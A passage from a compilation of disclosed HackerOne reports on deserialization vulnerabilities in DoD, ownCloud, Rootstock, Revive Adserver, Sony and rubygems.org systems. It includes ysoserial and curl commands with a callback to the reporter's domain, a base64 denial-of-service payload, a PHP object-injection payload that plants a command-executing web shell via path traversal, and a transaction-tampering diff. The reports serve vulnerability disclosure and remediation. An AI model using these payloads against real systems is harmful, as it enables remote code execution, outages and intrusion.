[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/329400)

- **Report ID:** `329400`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:50:10.020Z
- **CVE(s):** CVE-2017-10366

**Vulnerability Information:**

SUMMARY:
====================

This report describes a vulnerability similar to that described in my other reports #329376, #329397, #329399

The DoD **`https://████/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod_test.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod_test.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod_test.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
`curl https://████/psc/EXPROD/ --data-binary`@payload`-k`

After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:42:26.332 queries: info: client ████#8059: query: dod_test.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
`curl https://████/psc/EXPROD/ --data-binary`@payload_dos`-k`

This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path **/monitor** should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

---

### [2 vulnerabilities of arbitrary code in ████████  - CVE-2017-5929](https://hackerone.com/reports/272979)

- **Report ID:** `272979`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ruffdraft
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:40:54.565Z
- **CVE(s):** CVE-2017-5929

**Vulnerability Information:**

**Summary:**
GitHub repo: https://github.com/████████

QOS.ch Logback before 1.2.0 has a serialization vulnerability affecting the SocketServer and ServerSocketReceiver components. 

High Severity
Arbitrary Code Execution
Vulnerable module: ch.qos.logback:logback-core 
Introduced through: com.github.dblock.waffle:waffle-distro@1.8.1 
Detailed paths
Introduced through: ███@█████████#a746bb4ecce1cb252a301c08be0daffa480c9747 › com.github.dblock.waffle:waffle-distro@1.8.1 › ch.qos.logback:logback-core@1.1.3
Introduced through: ██████@███#a746bb4ecce1cb252a301c08be0daffa480c9747 › com.github.dblock.waffle:waffle-distro@1.8.1 › ch.qos.logback:logback-classic@1.1.3 › ch.qos.logback:logback-core@1.1.3

and

High Severity
Arbitrary Code Execution
Vulnerable module: ch.qos.logback:logback-classic 
Introduced through: com.github.dblock.waffle:waffle-distro@1.8.1 
Detailed paths
Introduced through: ████@█████#a746bb4ecce1cb252a301c08be0daffa480c9747 › com.github.dblock.waffle:waffle-distro@1.8.1 › ch.qos.logback:logback-classic@1.1.3


**Description:**
ch.qos.logback:logback-core and ch.qos.logback:logback-classic  Affected versions of this package are vulnerable Arbitrary Code Execution. A configuration can be turned on to allow remote logging through interfaces that accept untrusted serialized data. Authenticated attackers on the adjacent network can exploit this vulnerability to run arbitrary code through the deserialization of custom gadget chains.

## Impact
Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like Remote Method Invocation (RMI), Java Management Extension (JMX), Java Messaging System (JMS), Action Message Format (AMF), Java Server Faces (JSF) ViewState, etc.
Deserialization of untrusted data (CWE-502), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution. 
Java deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a popular library (Apache Commons Collection). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.
An attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.

## Step-by-step Reproduction Instructions

1. Run known POC CVE online

## Product, Version, and Configuration (If applicable)
ch.qos.logback:logback-core@1.1.3
ch.qos.logback:logback-classic@1.1.3

## Suggested Mitigation/Remediation Actions
update to latest version

---

### [Attacker can add arbitrary data to the blockchain without paying gas](https://hackerone.com/reports/396954)

- **Report ID:** `396954`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Rootstock Labs
- **Reporter:** @ahook
- **Bounty:** - usd
- **Disclosed:** 2019-09-18T13:18:55.944Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.

**Description:**
The issue stems from the Transaction::rlpParse function:
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242

Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data.

Since the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data.

## Steps To Reproduce:
On a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network:
```
remote:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
```

On my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions.

In addition to the config changes, I have also modified the eth_sendTransaction code to add extra rlp-encoded bytes to the end of the transaction. In order to easily see the data in a hex blob, I'm just setting it to a repeated 0xbeef string. I've also hacked the getBlockByHash function to return the full encoded hex block in the extraData field, as a quick way to query and see the raw block data.

```
local:~/rskj$ # Start the attacker's node:
local:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
local:~/rskj$
local:~/rskj$ # Create a new account:
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"personal_newAccount", "params": ["beef"], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":"0x0e016bdab929a365c7419ba51d0902cbde6035c2"}
local:~/rskj$
local:~/rskj$ # Send a transaction:
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_sendTransaction", "params": [{"from": "0xCd2a3d9f938e13Cd947eC05ABC7fe734df8DD826", "to":"0x0e016bdab929a365c7419ba51d0902cbde6035c2", "gas":"0x76c0", "gasPrice": "0x9184e72a000", "value":"0x9184e72a"}], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"}
local:~/rskj$
local:~/rskj$ # Wait for the transaction to propagate to the remote server and be mined
local:~/rskj$ # Then check the receipt to see that it made it into the block:
local:~/rskj$ $ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_getTransactionReceipt", "params": ["0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":{"transactionHash":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301","transactionIndex":"0x0","blockHash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","blockNumber":"0x681","cumulativeGasUsed":"0x5208","gasUsed":"0x5208","contractAddress":null,"logs":[],"from":"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826","to":"0x0e016bdab929a365c7419ba51d0902cbde6035c2","root":"0x01","status":"0x01"}}
local:~/rskj$
local:~/rskj$ # Now that we see our beefy transaction in the block, look up the raw block
local:~/rskj$ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_getBlockByHash", "params": ["0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747", true], "id":666}' http://127.0.0.1:4444/
{"jsonrpc":"2.0","id":666,"result":{"number":"0x681","hash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","parentHash":"0x6101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4b","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","logsBloom":"0x00000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000","transactionsRoot":"0x5e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4","stateRoot":"0xcacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2","receiptsRoot":"0x3f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabb","miner":"0xec4ddeb4380ad69b3e509baad9f158cdf4e4681d","difficulty":"0x01","totalDifficulty":"0x682","extraData":"0xf90383f902dba06101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4ba01dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d4934794ec4ddeb4380ad69b3e509baad9f158cdf4e4681da0cacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2a05e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4a03f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabbb9010000000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000018206818367c280825208845b78fd12808802ea11e32ad500000080b8507111010000000000000000000000000000000000000000000000000000000000000000009b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe12fd785bffff7f21670b0000a701000000019b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe0101b886000000000000040048d9465430728a2ba7f23b2792c24eaf61e134c8dafa6ec0fce944569ae2f7b752534b424c4f434b3aa74eb3b1efd29c88b6b250faa51e599dcf38b6bcf9080e0252cbf7574a29b54fffffffff0100f2052a01000000232103d3b2d67927fcbe6ea4f629d14f5938f6209186036e45833c3d51b3df80aab53aac00000000f8a2f880018609184e72a0008276c0940e016bdab929a365c7419ba51d0902cbde6035c2849184e72a8066a016e1fffd39de05273881dd8e2720664898bf28b34b57c568689eb3b969381d5aa05f157a0d01506a05685a2b9d4d74eb01b27486b00f6c3ac9823f1f6e12c732aa96beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefdf82068000009400000000000000000000000000000000010000088080808080c0","size":"0x386","gasLimit":"0x67c280","gasUsed":"0x5208","timestamp":"0x5b78fd12","transactions":[{"hash":"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301","nonce":"0x01","blockHash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","blockNumber":"0x681","transactionIndex":"0x0","from":"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826","to":"0x0e016bdab929a365c7419ba51d0902cbde6035c2","gas":"0x76c0","gasPrice":"0x09184e72a000","value":"0x009184e72a","input":"0x00"},{"hash":"0xa703402c0c77c41597a09088c0ef3c61bb608da4683f4de8b1a3569297a61b25","nonce":"0x0680","blockHash":"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747","blockNumber":"0x681","transactionIndex":"0x1","from":"0x0000000000000000000000000000000000000000","to":"0x0000000000000000000000000000000001000008","gas":"0x00","gasPrice":"0x00","value":"0","input":"0x00"}],"uncles":[],"minimumGasPrice":"0"}}
```

Sorry for the giant data dump there, but if you take a look at the extraData in the returned block (which is actually the full block hex because of the hacked code), you can see that the "beefbeefbeefbeef" data made it in.

This is a proof that a malicious node (my local node) can craft a transaction with extra data appended, share that transaction with the network via the normal p2p process, and have the extra data mined into a block.

Here's the full diff for the attacker/local node. Sorry again, it's a little hacky. I could have used the eth_sendRawTransaction endpoint, but I didn't want to go through the process of hand-constructing the rlp-encoded data:
```
diff --git a/rskj-core/src/main/java/org/ethereum/core/Transaction.java b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
index bbd21ee..801e18d 100644
--- a/rskj-core/src/main/java/org/ethereum/core/Transaction.java
+++ b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
@@ -164,7 +164,7 @@ public class Transaction {
     }
 
     public Transaction toImmutableTransaction() {
-        return new ImmutableTransaction(this.getEncoded());
+        return new ImmutableTransaction(this.getBeefyEncoded());
     }
 
     private byte extractChainIdFromV(byte v) {
@@ -516,7 +516,17 @@ public class Transaction {
         return rlpRaw;
     }
 
+    // Clear the rlpEncoded if present, and re-encode with extra 0xbeef data
+    public byte[] getBeefyEncoded() {
+        rlpEncoded = null;
+        return getEncodedInternal("beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeef");
+    }
+
     public byte[] getEncoded() {
+        return getEncodedInternal(null);
+    }
+    private byte[] getEncodedInternal(String beef) {
         if (rlpEncoded != null) {
             return rlpEncoded;
         }
@@ -556,8 +566,15 @@ public class Transaction {
             s = RLP.encodeElement(EMPTY_BYTE_ARRAY);
         }
 
-        this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
-                toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);
+        // if 0xbeef bytes are present, tack them on at the end of the tx
+        if (beef != null) {
+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s,
+                    RLP.encodeElement(Hex.decode(beef)));
+        } else {
+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);
+        }
 
         Keccak256 hash = this.getHash();
         this.hash = hash == null ? null : hash.getBytes();
diff --git a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
index 04d0ddb..ad0f3c1 100644
--- a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
+++ b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
@@ -599,7 +599,8 @@ public class Web3Impl implements Web3 {
         br.miner = isPending ? null : TypeConverter.toJsonHex(b.getCoinbase().getBytes());
         br.difficulty = TypeConverter.toJsonHex(b.getDifficulty().getBytes());
         br.totalDifficulty = TypeConverter.toJsonHex(this.blockchain.getBlockStore().getTotalDifficultyForHash(b.getHash().getBytes()).asBigInteger());
-        br.extraData = TypeConverter.toJsonHex(b.getExtraData());
+        // hacky, for testing, return the full encoded block instead of extraData
+        br.extraData = TypeConverter.toJsonHex(b.getEncoded());
         br.size = TypeConverter.toJsonHex(b.getEncoded().length);
         br.gasLimit = TypeConverter.toJsonHex(b.getGasLimit());
         Coin mgp = b.getMinimumGasPrice();
diff --git a/rskj-core/src/main/resources/config/regtest.conf b/rskj-core/src/main/resources/config/regtest.conf
index df111fa..1e81a7c 100644
--- a/rskj-core/src/main/resources/config/regtest.conf
+++ b/rskj-core/src/main/resources/config/regtest.conf
@@ -8,12 +8,13 @@ peer {
         # the peer window will show
         # only what retrieved by active
         # peer [true/false]
-        enabled = false
+        enabled = true
 
         # List of the peers to start
         # the search of the online peers
         # values: [ip:port]
-        ip.list = [ ]
+        # replace <target_ip> with the "real" network node that will be mining
+        ip.list = ["<target_ip>:50501"]
     }
 
     # Port for server to listen for incoming connections
@@ -24,7 +25,8 @@ peer {
 }
 
 miner {
-    server.enabled = true
+    # Attacker node won't mine, so we know the tx propagated through the network
+    server.enabled = false
     client.enabled = true
     minGasPrice = 0
```

## Impact

The attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data.

I can think of three ways to get this data into the system: 1) the method I detailed in the above PoC, in which the attacker creates a valid transaction and adds the data, 2) a malicious miner could just add the data to any valid transaction it has in its pool; 3) an attacker could wait for new pending transactions to appear, then add their data and send the tx back to the network. If the attacker's version of the tx makes it to the miner that produces the next block, the data will make it to the chain without the attacker even needing to create their own valid tx.

I have not checked to see how much data can be appended, but I assume its limited only by whatever overall block/transaction/message size constraints exist.

---

### [Remote Code Execution through Deserialization Attack in OwnBackup app.](https://hackerone.com/reports/562335)

- **Report ID:** `562335`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** ownCloud
- **Reporter:** @q3rv0
- **Bounty:** - usd
- **Disclosed:** 2019-07-01T16:35:37.405Z
- **CVE(s):** -

**Vulnerability Information:**

I found a deserialization vulnerability in the [OwnBackup](https://marketplace.owncloud.com/apps/ownbackup) app, this vulnerability allows to execute remote code in the server. 

An administrator user could install the vulnerable app, or take advantage of this vulnerability if the **OwnBackup** application is installed.

Below are the steps to properly exploit the deserialization vulnerability.

**Step 1:** Login in the Owncloud application as an administrator user.

**Step 2:** Install the **OwnBackup** app from the Marketplace.

**Step 3:** Go to **Files** and upload the following files to the server.

* **structure.xml**
```
<?xml version="1.0" ?>
<database><name>*dbname*</name><create>true</create><overwrite>false</overwrite><charset>utf8mb4</charset><table><name>oc_accounts</name><declaration><field><name>id</name><type>integer</type><default>0</default><notnull>true</notnull><autoincrement>1</autoincrement><unsigned>true</unsigned><length>8</length></field><field><name>email</name><type>text</type><default/><notnull>false</notnull><length>255</length></field><field><name>user_id</name><type>text</type><default/><notnull>true</notnull><length>255</length></field><field><name>lower_user_id</name><type>text</type><default/><notnull>true</notnull><length>255</length></field><field><name>display_name</name><type>text</type><default/><notnull>false</notnull><length>255</length></field><field><name>quota</name><type>text</type><default/><notnull>false</notnull><length>32</length></field><field><name>last_login</name><type>integer</type><default>0</default><notnull>true</notnull><length>4</length></field><field><name>backend</name><type>text</type><default/><notnull>true</notnull><length>64</length></field><field><name>home</name><type>text</type><default/><notnull>true</notnull><length>1024</length></field><field><name>state</name><type>integer</type><default>0</default><notnull>true</notnull><length>2</length></field><index><name>UNIQ_907AA303A76ED395</name><unique>true</unique><field><name>user_id</name><sorting>ascending</sorting></field></index><index><name>lower_user_id_index</name><unique>true</unique><field><name>lower_user_id</name><sorting>ascending</sorting></field></index><index><name>display_name_index</name><field><name>display_name</name><sorting>ascending</sorting></field></index><index><name>email_index</name><field><name>email</name><sorting>ascending</sorting></field></index></declaration></table></database>
```

* **data.dump**
```
O:33:"Swift_Transport_SendmailTransport":3:{s:10:"*_buffer";O:31:"Swift_ByteStream_FileByteStream":4:{s:38:"Swift_ByteStream_FileByteStream_path";s:14:"/tmp/pwned.php";s:38:"Swift_ByteStream_FileByteStream_mode";s:3:"w+b";s:56:"Swift_ByteStream_AbstractFilterableInputStream_filters";a:0:{}s:60:"Swift_ByteStream_AbstractFilterableInputStream_writeBuffer";s:57:"<?php system($_GET['exec']); ?> // fedef@secsignal.org
//";}s:11:"*_started";b:1;s:19:"*_eventDispatcher";O:34:"Swift_Events_SimpleEventDispatcher":0:{}}
```

**Step 4:** Go to **admin** > **Settings** > **Additional**.

**Step 5:** In **OwnBackup** > **Create Backup**.

**Step 6:** Select the created backup and select any table to restore > **Restore tables**

**Step 7:** Capture the next request with the BurpSuite proxy.

```
POST /owncloud/index.php/apps/ownbackup/restore-tables HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: 
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 45
Cookie: ocyqfze0wn1b=u1b58qbra5g0lh2rujgofg2f77; oc_sessionPassphrase=hAgcALFZ%2FrAi6y%2BtM8KNRbpzscVNFLnPIi1tz6zPzRCyCjUoFpZd5xlZOejCE2zoN5Dz4io832pAeKlPu7grxmHVGflUFJ2hrE0xdnovBqxGgEQN7VC1i6GbEaHfW1NP; shortest-last-redirect-time=1500074341246; _ga=GA1.1.1537606638.1500074341; shortest-last-pop-under=1500074352780; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; MANTIS_MANAGE_CONFIG_COOKIE=0%3A0%3A-2; MANTIS_PROJECT_COOKIE=5
Connection: close

timestamp=1555661563&tables%5B%5D=oc_accounts
```
And change the value of the parameter **tables[]** by the following path traversal.

```
../../admin/files
```
The modified request is left as follows.

```
POST /owncloud/index.php/apps/ownbackup/restore-tables HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: 
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 45
Cookie: ocyqfze0wn1b=u1b58qbra5g0lh2rujgofg2f77; oc_sessionPassphrase=hAgcALFZ%2FrAi6y%2BtM8KNRbpzscVNFLnPIi1tz6zPzRCyCjUoFpZd5xlZOejCE2zoN5Dz4io832pAeKlPu7grxmHVGflUFJ2hrE0xdnovBqxGgEQN7VC1i6GbEaHfW1NP; shortest-last-redirect-time=1500074341246; _ga=GA1.1.1537606638.1500074341; shortest-last-pop-under=1500074352780; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; MANTIS_MANAGE_CONFIG_COOKIE=0%3A0%3A-2; MANTIS_PROJECT_COOKIE=5
Connection: close

timestamp=1555661563&tables%5B%5D=../../admin/files
```
The serialized payload within the **data.dump** file is intended to create the file **pwned.php** within the **/tmp** directory as a PoC. But the same file could be created within the web directory, to execute commands remotely.

Contents of the file pwned.php.
```
<?php system($_GET['exec']); ?> // fedef@secsignal.org
```
**Step 8:** View the **/tmp/pwned.php** file created correctly.

## Impact

An attacker could execute commands remotely on the server.

---

### [Deserialization of Untrusted Data in www/delivery/adxmlrpc.php](https://hackerone.com/reports/512076)

- **Report ID:** `512076`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Revive Adserver
- **Reporter:** @mbeccati
- **Bounty:** - usd
- **Disclosed:** 2019-04-23T13:08:01.674Z
- **CVE(s):** -

**Vulnerability Information:**

An attacker could send a specifically crafted payload to the XML-RPC invocation script and trigger the unserialize() call on the "what" parameter in the "openads.spc" RPC method.

## Impact

Such vulnerability could be used to perform various types of attacks, e.g. exploit serialize-related PHP vulnerabilities or PHP object injection.

It is possible, although unconfirmed, that the vulnerability has been used by some attackers in order to gain access to some Revive Adserver instances and deliver malware through them to third party websites.

---

### [Deserialization of Untrusted Data in www/delivery/dxmlrpc.php](https://hackerone.com/reports/542670)

- **Report ID:** `542670`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Revive Adserver
- **Reporter:** @mbeccati
- **Bounty:** - usd
- **Disclosed:** 2019-04-23T13:06:06.123Z
- **CVE(s):** -

**Vulnerability Information:**

An attacker could send a specifically crafted payload to the XML-RPC invocation script and trigger the unserialize() call on the first parameter in the "pluginExecute" RPC method.

## Impact

Such vulnerability could be used to perform various types of attacks, e.g. exploit serialize-related PHP vulnerabilities or PHP object injection.

---

### [Remote Code Execution (RCE) in a Sony WebSystem](https://hackerone.com/reports/329572)

- **Report ID:** `329572`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Sony
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2019-01-23T17:36:13.380Z
- **CVE(s):** -

**Summary (team):**

⠀

---

### [Remote Code Execution (RCE) in a Sony Pictures WebSystem](https://hackerone.com/reports/330028)

- **Report ID:** `330028`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Sony
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2019-01-23T17:35:45.065Z
- **CVE(s):** -

**Summary (team):**

⠀

---

### [CTF Writeup flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}](https://hackerone.com/reports/415275)

- **Report ID:** `415275`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** h1-5411-CTF
- **Reporter:** @den1al
- **Bounty:** - usd
- **Disclosed:** 2018-11-21T16:01:43.066Z
- **CVE(s):** -

**Vulnerability Information:**

We have attached the writeup, the CTF was solved by me and Chapuka.

We would like to publish our writeup for the CTF in our blog, when can we do that?

It was a great CTF, it's a shame we are not @Buenos Aires right now :/

## Impact

.

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/329397)

- **Report ID:** `329397`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2018-04-17T18:22:00.394Z
- **CVE(s):** CVE-2017-10366

**Summary (team):**

An application deserialization vulnerability was found in a misconfigured Department of Defense (DoD) website by @joaomatosf via POST/GET request. Impressive work. This showcases your skills!

Thank you for supporting the DoD Vulnerability Disclosure Program!

---

### [Remote code execution on rubygems.org](https://hackerone.com/reports/274990)

- **Report ID:** `274990`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** RubyGems
- **Reporter:** @max
- **Bounty:** 1500 usd
- **Disclosed:** 2017-11-09T05:56:39.178Z
- **CVE(s):** CVE-2017-0903

**Vulnerability Information:**

When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`. The authors of the application correctly observed that parsing untrusted YAML is dangerous (since it can serialize more or less arbitrary objects), so they monkey-patched the spec parser to use `Psych.safe_load` set from `config/initializers/forbidden_yaml.rb`.

However, `YAML.load` is called directly when parsing the gem's checksum file in `Gem::Package#read_checksums`. Using classes accessible within the application, I was able to turn this into a call to `Marshal.load` on attacker-controlled data. From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away).

